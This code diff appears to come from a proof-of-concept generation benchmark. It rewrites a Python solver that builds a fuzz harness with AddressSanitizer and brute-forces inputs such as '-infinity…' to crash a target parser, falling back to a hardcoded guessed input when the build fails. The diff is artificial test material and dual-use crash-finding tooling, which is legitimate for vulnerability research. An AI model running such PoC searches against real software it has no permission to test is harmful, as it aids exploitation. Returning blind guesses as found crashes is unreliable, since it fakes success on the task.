@@ -1,292 +1,231 @@
 import os
-import re
 import tarfile
 import tempfile
 import subprocess
-import random
-from typing import Optional, List, Tuple
+import shutil
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc: Optional[bytes] = None
-
+        poc = None
         try:
-            with tempfile.TemporaryDirectory() as tmpdir:
-                # Extract the tarball
-                try:
-                    with tarfile.open(src_path, "r:*") as tar:
-                        tar.extractall(tmpdir)
-                except Exception:
-                    # If extraction fails for any reason, fall back to static PoC
-                    return b"-123456789012345"
-
-                build_result = self._build_harness(tmpdir)
-                if build_result is not None:
-                    bin_path, has_asan = build_result
-                    try:
-                        poc = self._find_poc(bin_path, tmpdir, has_asan)
-                    except Exception:
-                        poc = None
-
+            poc = self._generate_poc_via_build(src_path)
         except Exception:
             poc = None
-
         if poc is not None:
             return poc
+        return b"-" + b"i" * 15
 
-        # Fallback static PoC (16 bytes, leading minus sign)
-        return b"-123456789012345"
+    def _generate_poc_via_build(self, src_path: str):
+        workdir = tempfile.mkdtemp(prefix="poc_work_")
+        try:
+            with tarfile.open(src_path, "r:*") as tf:
+                tf.extractall(workdir)
+            runner_path = self._build_runner(workdir)
+            if runner_path is None:
+                return None
+            poc = self._search_crash_input(runner_path, workdir)
+            return poc
+        finally:
+            try:
+                shutil.rmtree(workdir)
+            except Exception:
+                pass
 
-    def _build_harness(self, src_root: str) -> Optional[Tuple[str, bool]]:
-        main_candidates: List[Tuple[int, str]] = []
+    def _find_compiler(self, cpp: bool):
+        candidates_cpp = ["clang++", "g++", "c++"]
+        candidates_c = ["clang", "gcc", "cc"]
+        candidates = candidates_cpp if cpp else candidates_c
+        for c in candidates:
+            if shutil.which(c):
+                return c
+        return None
 
-        # Find candidate C/C++ files containing main()
-        for root, _, files in os.walk(src_root):
-            for name in files:
+    def _build_runner(self, workdir: str):
+        fuzzer_src = None
+        for dirpath, _, filenames in os.walk(workdir):
+            for name in filenames:
                 if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                     continue
-                path = os.path.join(root, name)
+                path = os.path.join(dirpath, name)
                 try:
                     with open(path, "r", errors="ignore") as f:
-                        content = f.read()
+                        txt = f.read()
                 except Exception:
                     continue
-                if "main(" in content:
-                    score = 0
-                    lname = name.lower()
-                    if "llvmfuzzertestoneinput" in content:
-                        score += 3
-                    if "fuzz" in lname or "poc" in lname or "test" in lname:
-                        score += 1
-                    main_candidates.append((score, path))
-
-        if not main_candidates:
+                if "LLVMFuzzerTestOneInput" in txt:
+                    fuzzer_src = path
+                    break
+            if fuzzer_src is not None:
+                break
+        if fuzzer_src is None:
             return None
 
-        main_candidates.sort(key=lambda x: x[0], reverse=True)
-        bin_path = os.path.join(src_root, "fuzz_target")
+        ext = os.path.splitext(fuzzer_src)[1].lower()
+        is_cpp = ext in (".cc", ".cpp", ".cxx")
 
-        for _, path in main_candidates:
-            ext = os.path.splitext(path)[1].lower()
-            if ext == ".c":
-                compilers = ["clang", "gcc"]
-            else:
-                compilers = ["clang++", "g++"]
+        compiler = self._find_compiler(is_cpp)
+        if compiler is None:
+            return None
 
-            for cc in compilers:
-                # First try with ASan
-                cmd_asan = [
-                    cc,
-                    "-g",
-                    "-O1",
-                    "-fno-omit-frame-pointer",
-                    "-fsanitize=address",
-                    path,
-                    "-lm",
-                    "-o",
-                    bin_path,
-                ]
-                try:
-                    res = subprocess.run(
-                        cmd_asan,
-                        cwd=src_root,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        timeout=120,
-                    )
-                    if res.returncode == 0 and os.path.exists(bin_path):
-                        return bin_path, True
-                except (subprocess.TimeoutExpired, FileNotFoundError):
-                    pass
-
-                # Then without ASan, in case ASan isn't available
-                cmd_no_asan = [
-                    cc,
-                    "-g",
-                    "-O1",
-                    path,
-                    "-lm",
-                    "-o",
-                    bin_path,
-                ]
-                try:
-                    res = subprocess.run(
-                        cmd_no_asan,
-                        cwd=src_root,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        timeout=120,
-                    )
-                    if res.returncode == 0 and os.path.exists(bin_path):
-                        return bin_path, False
-                except (subprocess.TimeoutExpired, FileNotFoundError):
-                    pass
-
-        return None
-
-    def _find_poc(self, bin_path: str, workdir: str, has_asan: bool) -> Optional[bytes]:
-        candidates = self._generate_candidates()
-
-        for data in candidates:
-            try:
-                if self._trigger_crash(bin_path, workdir, data, has_asan):
-                    return data
-            except Exception:
-                # Ignore individual candidate failures and continue
-                continue
-
-        return None
-
-    def _trigger_crash(
-        self, bin_path: str, workdir: str, data: bytes, has_asan: bool
-    ) -> bool:
-        # Try feeding data via stdin
+        runner_main_name = "runner_main.cc" if is_cpp else "runner_main.c"
+        runner_main_path = os.path.join(workdir, runner_main_name)
+        runner_main_code = (
+            "#include <stdio.h>\n"
+            "#include <stdlib.h>\n"
+            "#include <stdint.h>\n"
+            "#include <stddef.h>\n"
+            "int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);\n"
+            "int main(int argc, char **argv) {\n"
+            "    const char *filename = \"poc_input\";\n"
+            "    FILE *f = fopen(filename, \"rb\");\n"
+            "    if (!f) return 1;\n"
+            "    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 1; }\n"
+            "    long sz = ftell(f);\n"
+            "    if (sz < 0) { fclose(f); return 1; }\n"
+            "    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 1; }\n"
+            "    size_t size = (size_t)sz;\n"
+            "    uint8_t *buf = (uint8_t *)malloc(size + 1);\n"
+            "    if (!buf) { fclose(f); return 1; }\n"
+            "    size_t n_read = fread(buf, 1, size, f);\n"
+            "    fclose(f);\n"
+            "    if (n_read != size) { free(buf); return 1; }\n"
+            "    buf[size] = 0;\n"
+            "    LLVMFuzzerTestOneInput(buf, size);\n"
+            "    free(buf);\n"
+            "    return 0;\n"
+            "}\n"
+        )
         try:
-            proc = subprocess.run(
-                [bin_path],
-                input=data,
-                cwd=workdir,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.PIPE,
-                timeout=0.5,
-            )
-            if self._is_crash(proc, has_asan):
-                return True
-        except subprocess.TimeoutExpired:
-            pass
+            with open(runner_main_path, "w") as f:
+                f.write(runner_main_code)
         except Exception:
-            pass
+            return None
 
-        # Try feeding data via a temporary file path argument
-        tmp_file = None
-        try:
-            with tempfile.NamedTemporaryFile(dir=workdir, delete=False) as f:
-                f.write(data)
-                f.flush()
-                tmp_file = f.name
-
-            proc = subprocess.run(
-                [bin_path, tmp_file],
-                cwd=workdir,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.PIPE,
-                timeout=0.5,
-            )
-            if self._is_crash(proc, has_asan):
-                return True
-        except subprocess.TimeoutExpired:
-            pass
-        except Exception:
-            pass
-        finally:
-            if tmp_file is not None:
-                try:
-                    os.unlink(tmp_file)
-                except OSError:
-                    pass
-
-        return False
-
-    def _is_crash(self, proc: subprocess.CompletedProcess, has_asan: bool) -> bool:
-        rc = proc.returncode
-        if rc is None:
-            return False
-
-        # Negative return code usually means terminated by a signal (e.g., SIGSEGV)
-        if rc < 0:
-            return True
-
-        stderr = proc.stderr or b""
-        lower = stderr.lower()
-
-        if b"addresssanitizer" in lower or b"asan" in lower:
-            return True
-        if b"ubsan" in lower or b"undefinedbehaviour" in lower or b"undefined behavior" in lower:
-            return True
-        if b"stack-buffer-overflow" in lower or b"heap-buffer-overflow" in lower:
-            return True
-        if not has_asan:
-            if b"segmentation fault" in lower or b"stack smashing" in lower:
-                return True
-
-        return False
-
-    def _generate_candidates(self) -> List[bytes]:
-        seeds = [
-            "-0",
-            "-1",
-            "-9",
-            "-12345",
-            "-0.0",
-            "-1.0",
-            "-.inf",
-            "-inf",
-            "-INF",
-            "-infinity",
-            "-INFINITY",
-            "-Infinity",
-            "-nan",
-            "-NaN",
-            "-NAN",
-            "-0inf",
-            "-0infinity",
-            "--inf",
-            "--infinity",
-            "-inff",
-            "-i",
-            "-x",
-            "-.",
-        ]
-
-        lengths = [16, 32, 64, 128, 256]
-        candidates: List[bytes] = []
-
-        # Deterministic expansions of seeds to multiple lengths
-        for s in seeds:
-            base = s.encode("ascii", errors="ignore")
-            if not base:
-                continue
-            for L in lengths:
-                if L <= len(base):
-                    cand = base[:L]
-                else:
-                    pad_byte = base[-1:]
-                    cand = base + pad_byte * (L - len(base))
-                if cand and cand[0] != ord("-"):
-                    cand = b"-" + cand[1:]
-                candidates.append(cand)
-
-        # Patterns: '-' followed by a repeated character
-        pad_chars = b"0123456789infxyzabcde"
-        for ch in pad_chars:
-            for L in lengths:
-                if L < 1:
+        source_files = []
+        for dirpath, _, filenames in os.walk(workdir):
+            for name in filenames:
+                if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                     continue
-                cand = b"-" + bytes([ch]) * (L - 1)
-                candidates.append(cand)
+                path = os.path.join(dirpath, name)
+                if os.path.abspath(path) == os.path.abspath(runner_main_path):
+                    continue
+                rel = os.path.relpath(path, workdir)
+                try:
+                    with open(path, "r", errors="ignore") as f:
+                        txt = f.read()
+                except Exception:
+                    txt = ""
+                if " main(" in txt or "\nmain(" in txt or "main (" in txt:
+                    continue
+                source_files.append(rel)
 
-        # Some deterministic pseudo-random patterns, all starting with '-'
-        random.seed(0)
-        alphabet = b"-+0123456789eE.,infINFTYabcxyz"
-        for _ in range(60):
-            L = random.randint(8, 64)
-            buf = bytearray()
-            for _ in range(L):
-                buf.append(random.choice(alphabet))
-            if not buf:
-                buf = bytearray(b"-")
-            else:
-                buf[0] = ord("-")
-            candidates.append(bytes(buf))
+        rel_fuzzer = os.path.relpath(fuzzer_src, workdir)
+        if rel_fuzzer not in source_files:
+            source_files.append(rel_fuzzer)
 
-        # Ensure uniqueness to avoid redundant runs
-        # Keep order (Python 3.7+ dict preserves insertion order)
-        unique_candidates: List[bytes] = []
+        base_cmd = [compiler, "-g", "-O1", "-I.", os.path.relpath(runner_main_path, workdir)]
+        if is_cpp:
+            base_cmd.append("-std=c++11")
+        else:
+            base_cmd.append("-std=c11")
+        base_cmd.append("-Wall")
+
+        def try_compile(extra_flags):
+            cmd = base_cmd + extra_flags + source_files + ["-o", "runner"]
+            try:
+                res = subprocess.run(
+                    cmd,
+                    cwd=workdir,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    timeout=120,
+                )
+            except Exception:
+                return False
+            return res.returncode == 0
+
+        if not try_compile(["-fsanitize=address"]):
+            if not try_compile([]):
+                return None
+
+        return os.path.join(workdir, "runner")
+
+    def _candidate_generator(self):
         seen = set()
-        for c in candidates:
+
+        def add(c):
             if c not in seen:
                 seen.add(c)
-                unique_candidates.append(c)
+                return True
+            return False
 
-        return unique_candidates
+        big_sizes = (16, 64, 256, 1024)
+        inf_like_words = [b"inf", b"infinity"]
+        for total in big_sizes:
+            for word in inf_like_words:
+                times = (total - 1) // len(word) + 1
+                body = (word * times)[: total - 1]
+                cand = b"-" + body
+                if add(cand):
+                    yield cand
+            body = b"i" * (total - 1)
+            cand = b"-" + body
+            if add(cand):
+                yield cand
+
+        words = [
+            b"inf",
+            b"infi",
+            b"infin",
+            b"infini",
+            b"infinity",
+            b"INF",
+            b"INFINITY",
+            b"Infinity",
+            b"infX",
+            b"infinityX",
+        ]
+        tails = [b"", b"x", b"xx", b"xyz", b"1234"]
+        for w in words:
+            for t in tails:
+                for extra in range(0, 3):
+                    body = w + t + (b"i" * extra)
+                    cand = b"-" + body
+                    if add(cand):
+                        yield cand
+
+        for ch in (b"i", b"n", b"f"):
+            for k in range(1, 65):
+                body = ch * k
+                cand = b"-" + body
+                if add(cand):
+                    yield cand
+
+        cand = b"-" + b"i" * 15
+        if add(cand):
+            yield cand
+
+    def _search_crash_input(self, runner_path: str, workdir: str):
+        input_path = os.path.join(workdir, "poc_input")
+        for cand in self._candidate_generator():
+            try:
+                with open(input_path, "wb") as f:
+                    f.write(cand)
+            except Exception:
+                continue
+            try:
+                res = subprocess.run(
+                    [runner_path],
+                    cwd=workdir,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.PIPE,
+                    timeout=1.0,
+                )
+            except subprocess.TimeoutExpired:
+                return cand
+            except Exception:
+                continue
+            if res.returncode != 0:
+                return cand
+        return None
